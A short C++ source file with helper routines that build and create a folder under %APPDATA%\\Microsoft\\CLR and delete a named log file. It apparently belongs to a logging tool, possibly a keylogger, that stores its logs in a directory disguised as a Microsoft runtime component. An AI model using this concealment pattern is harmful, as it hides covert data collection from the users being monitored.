#include "stdafx.h"
#include "InputOutup.h"
#include "CurrentTimeDate.h"

using namespace std;

string InputOutup::getPath(const bool append)
{
	string appdata_dir(getenv("APPDATA"));
	string full = appdata_dir + "\\Microsoft\\CLR";
	return full + (append ? "\\" : "");
}

bool InputOutup::setDir(string path)
{
	return CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

bool InputOutup::fillDir(string path)
{
	for(char &c : path)
		if (c == '\\')
		{
			c = '\0';
			if (!setDir(path))
				return false;
			c = '\\';
		}
	return true;
}

void InputOutup::deleteLog(string name)
{
	LPTSTR x = new TCHAR[name.size() + 1];
	strcpy((char*)x, name.c_str());
	DeleteFile(x);
}

InputOutup::InputOutup()
{
}


InputOutup::~InputOutup()
{
}
